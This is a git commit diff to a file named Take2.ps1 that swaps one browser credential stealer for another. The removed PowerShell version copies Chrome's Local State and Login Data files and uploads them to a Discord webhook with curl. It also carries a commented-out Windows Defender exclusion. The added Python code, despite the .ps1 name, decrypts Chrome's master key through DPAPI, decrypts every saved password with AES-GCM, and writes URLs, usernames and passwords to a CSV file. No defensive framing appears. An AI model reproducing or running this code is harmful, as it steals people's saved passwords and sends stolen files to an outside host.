a57e4f9246a391adb96898c5040965acb96a4085
wywy1234 <117038118+wywy1234@users.noreply.github.com>
2023-12-01 11:28:57 -0600

    Update Take2.ps1

--- Take2.ps1
+++ Take2.ps1
@@ -1,56 +1,102 @@
-# Define the folder path to be created and added to the exclusion list
-$folderPath = "C:\Junk"  
+#Full Credits to LimerBoy
+import os
+import re
+import sys
+import json
+import base64
+import sqlite3
+import win32crypt
+from Crypto.Cipher import AES
+import shutil
+import csv
 
-# Create the folder
-New-Item -ItemType Directory -Path $folderPath -Force
+#GLOBAL CONSTANT
+CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
+CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
 
-# Add the folder path to the Windows Defender exclusion list
-#Add-MpPreference -ExclusionPath $folderPath -Force -ErrorAction Stop
+def get_secret_key():
+    try:
+        #(1) Get secretkey from chrome local state
+        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        #Remove suffix DPAPI
+        secret_key = secret_key[5:] 
+        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
+        return secret_key
+    except Exception as e:
+        print("%s"%str(e))
+        print("[ERR] Chrome secretkey cannot be found")
+        return None
+    
+def decrypt_payload(cipher, payload):
+    return cipher.decrypt(payload)
 
-# Define the source paths
-$localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
-$loginDataPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+def generate_cipher(aes_key, iv):
+    return AES.new(aes_key, AES.MODE_GCM, iv)
 
-# Copy the folders to the destination without errors and bypassing Windows Defender
-try {
-    Copy-Item -Path $localStatePath -Destination $folderPath -Recurse -Force -ErrorAction Stop
-    Copy-Item -Path $loginDataPath -Destination $folderPath -Recurse -Force -ErrorAction Stop
-}
-catch {
-    Write-Host "An error occurred: $_"
-}
-
-# Rename the copied files to state.txt and data.txt
-try {
-    Rename-Item -Path "$folderPath\Local State" -NewName "$folderPath\state.txt" -Force
-    Rename-Item -Path "$folderPath\Login Data" -NewName "$folderPath\data.txt" -Force
-}
-catch {
-    Write-Host "An error occurred: $_"
-}
-
-############################################################################
-function Upload-Discord {
-
-    [CmdletBinding()]
-    param (
-        [parameter(Position=0,Mandatory=$False)]
-        [string]$file
-    )
-
-    $hookurl = "$dc"
-
-    if (-not ([string]::IsNullOrEmpty($file))){
-        curl.exe -F "file1=@$file" $hookurl
-    }
-}
-
-$stateFilePath = Join-Path -Path $folderPath -ChildPath "state.txt"
-$dataFilePath = Join-Path -Path $folderPath -ChildPath "data.txt"
-
-if (-not ([string]::IsNullOrEmpty($dc))){
-    Upload-Discord -file $stateFilePath
-    Upload-Discord -file $dataFilePath
-}
-
-Pause
+def decrypt_password(ciphertext, secret_key):
+    try:
+        #(3-a) Initialisation vector for AES decryption
+        initialisation_vector = ciphertext[2:16]
+        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
+        #Encrypted password is 192 bits
+        encrypted_password = ciphertext[16:-16]
+        #(4) Build the cipher to decrypt the ciphertext
+        cipher = generate_cipher(secret_key, initialisation_vector)
+        decrypted_pass = decrypt_payload(cipher, encrypted_password)
+        decrypted_pass = decrypted_pass.decode()  
+        return decrypted_pass
+    except Exception as e:
+        print("%s"%str(e))
+        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
+        return ""
+    
+def get_db_connection(chrome_path_login_db):
+    try:
+        print(chrome_path_login_db)
+        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
+        return sqlite3.connect("Loginvault.db")
+    except Exception as e:
+        print("%s"%str(e))
+        print("[ERR] Chrome database cannot be found")
+        return None
+        
+if __name__ == '__main__':
+    try:
+        #Create Dataframe to store passwords
+        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
+            csv_writer.writerow(["index","url","username","password"])
+            #(1) Get secret key
+            secret_key = get_secret_key()
+            #Search user profile or default folder (this is where the encrypted login password is stored)
+            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
+            for folder in folders:
+            	#(2) Get ciphertext from sqlite database
+                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
+                conn = get_db_connection(chrome_path_login_db)
+                if(secret_key and conn):
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    for index,login in enumerate(cursor.fetchall()):
+                        url = login[0]
+                        username = login[1]
+                        ciphertext = login[2]
+                        if(url!="" and username!="" and ciphertext!=""):
+                            #(3) Filter the initialisation vector & encrypted password from ciphertext 
+                            #(4) Use AES algorithm to decrypt the password
+                            decrypted_password = decrypt_password(ciphertext, secret_key)
+                            print("Sequence: %d"%(index))
+                            print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
+                            print("*"*50)
+                            #(5) Save into CSV 
+                            csv_writer.writerow([index,url,username,decrypted_password])
+                    #Close database connection
+                    cursor.close()
+                    conn.close()
+                    #Delete temp login db
+                    os.remove("Loginvault.db")
+    except Exception as e:
+        print("[ERR] %s"%str(e))
